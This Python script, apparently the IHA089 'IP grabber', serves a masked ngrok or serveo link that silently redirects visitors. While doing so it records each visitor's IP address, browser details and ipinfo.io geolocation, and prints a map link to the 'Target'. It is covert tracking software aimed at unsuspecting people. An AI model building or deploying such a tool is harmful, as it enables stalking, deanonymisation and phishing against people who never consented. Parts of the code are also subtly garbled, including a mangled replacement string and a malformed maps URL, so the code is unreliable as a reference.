import urllib.request
import json
import os
import sys
import subprocess
import re
import time
import socket
import urlget
import urlmask
from time import sleep

current_client_ip=""

def check_connection():
    try:
        urllib.request.urlopen("https://google.com")
        return True
    except:
        return False
    

def get_ip_info(ip):
    url = "https://ipinfo.io/{}/json".format(ip)
    response = urllib.request.urlopen(url)
    if response.getcode() == 200:
        read_data = json.loads(str(response.read(),'utf-8'))
        if read_data['city']:
            print("city Name ::: {}".format(read_data['city']))

        if read_data['region']:
            print("region Name ::: {}".format(read_data['region']))
        
        if read_data['country']:
            print("country ::: {}".format(read_data['country']))

        if read_data['loc']:
            location = read_data['loc']
            print("location ::: {}".format(location))
            loc = location.split(",")
            print("Google map url ::: https://www.google.com/maps?q=2{},{}".format(loc[0], loc[1]))

        if read_data['org']:
            print("org ::: {}".format(read_data['org']))
        
        if read_data['postal']:
            print("postal ::: {}".format(read_data['postal']))
        
        if read_data['timezone']:
            print("timezone ::: {}".format(read_data['timezone']))
        

def home_logo():
    print("""
        ####   ##     ##      ###        #####      #######     ####### 
         ##    ##     ##     ## ##      ##   ##    ##     ##   ##     ##
         ##    ##     ##    ##   ##    ##     ##   ##     ##   ##     ##
         ##    #########   ##     ##   ##     ##    #######     ########
         ##    ##     ##   #########   ##     ##   ##     ##          ##
         ##    ##     ##   ##     ##    ##   ##    ##     ##   ##     ##
        ####   ##     ##   ##     ##     #####      #######     #######
    
IHA089: Navigating the Digital Realm with Code and Security - Where Programming Insights Meet Cyber Vigilance.
    """)

def redirector():
    html_content = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <script type="text/javascript">
        window.location.href = "https://google.com";
    </script>
</head>
</html>
    """
    return html_content

def browser_data_filter(data):
    data = data.replace("Plt:", "Platform Type :::  ")
    data = data.replace("oscpu:", "OsCPU       :::  ")
    data = data.replace("sw:", "Screen Width   ::Location according browser :::  https://www.google.com/maps?q=:  ")
    data = data.replace("sh:", "Screen Height  :::  ")
    data = data.replace("vw:", "ViewPort Width :::  ")
    data = data.replace("vh:", "ViewPort Height:::  ")
    data = data.replace("ce:", "cookies Enable :::  ")
    data = data.replace("jn:", "Javascript Enable  :::  ")
    data = data.replace("ci:", "Internet Speed  :::  ")
    newdata = data.split("|")
    for ndata in newdata:
        print(ndata)

    print("++++++++++++++++++++++++++++++++++++++++++++++++++\n\n")

def post_data_reader(client_socket, request):
    match = re.match(r'POST /(\w+)', request)
    if match:
        path = match.group(1)
        content_length_match = re.search(r'Content-Length: (\d+)', request)
        main_data=str(request)
        if content_length_match:
            content_length = int(content_length_match.group(1))
            body = client_socket.recv(content_length).decode('utf-8')
            client_socket.sendall('HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"status": "success"}'.encode('utf-8'))
            browser_data_filter(body)
        else:
            client_socket.sendall('HTTP/1.1 400 Bad Request\n\nMissing Content-Length header'.encode('utf-8'))
    client_socket.sendall('HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"status": "success"}'.encode('utf-8'))


def filter_data(http_request):
    http_lines = http_request.strip().split('\n')
    headers_dict = {}
    for line in http_lines[1:]:
        key, value = line.split(': ', 1)
        headers_dict[key] = value
    
    try:
        user_agent = headers_dict['User-Agent']
    except:
        user_agent = "Not Found"
    try:
        Accept_Language = headers_dict['Accept-Language']
    except:
        Accept_Language = "Not Found"
    try:
        sch = headers_dict['Sec-Ch-Ua']
    except:
        sch = "Not Found"
    try:
        schp = headers_dict['Sec-Ch-Ua-Platform']
    except:
        schp = "Not Found"
    xff = headers_dict['X-Forwarded-For']
    global current_client_ip
    #if xff != current_client_ip:
        #current_client_ip = xff
    print("User Agent  ::: {}".format(user_agent))
    print("Accept Language ::: {}".format(Accept_Language))
    print("Browser version ::: {}".format(sch))
    print("Platform ::: {}".format(schp))
    print("IP Address ::: {}".format(xff))
    get_ip_info(xff)

def port_forwder():
    print("1\tNgrok\n2\tServeo.net")
    try:
        choice = int(input("Enter choice[1/2]:"))
    except:
        print("Please enter 1 or 2 only")
        sys.exit()
    
    if choice == 1:
        print("Getting public url....")
        port = 4567
        public_url = urlget.start_ngrok_http(port)
        if public_url:
            return public_url
        else:
            print("Failed to start ngrok or fetch the public URL.")
            sys.exit()
    elif choice == 2:
        print("Getting public url....")
        urlget.create_public_connection()
        time.sleep(7)
        ng_url = urlget.get_public_url()
        ng_url = ng_url.replace(" ","")
        return ng_url

def start_server(redirect_url):
    iha089_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    iha089_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    iha089_server.bind(("localhost", 4567))
    ng_url = port_forwder()
    urlmask.urlmasker(ng_url)
    iha089_server.listen(1)
    try:
        while True:
            client_socket, client_address = iha089_server.accept()
            request = str(client_socket.recv(1024),'utf-8')
            send_data = redirector()
            send_data = send_data.replace("https://google.com", redirect_url)
            http_response = f'HTTP/1.1 200 OK\nContent-Type: text/html\n\n{send_data}'
            client_socket.sendall(http_response.encode('utf-8'))
            client_socket.close()
            request = request.replace("\r\n","\n")
            print("=====================Target Info=====================")
            filter_data(request)

    except KeyboardInterrupt:
        print("Exiting.....")

def main():
    home_logo()
    if not check_connection():
        print("Please check your Internet connection")
        sys.exit()
    
    redirect_url = input("Provide redirect url(Ex: https://google.com) ::: ")
    if redirect_url == "":
        redirect_url = "https://google.com"
    print("Starting server...")
    start_server(redirect_url)
    

if __name__== "__main__":
    main()
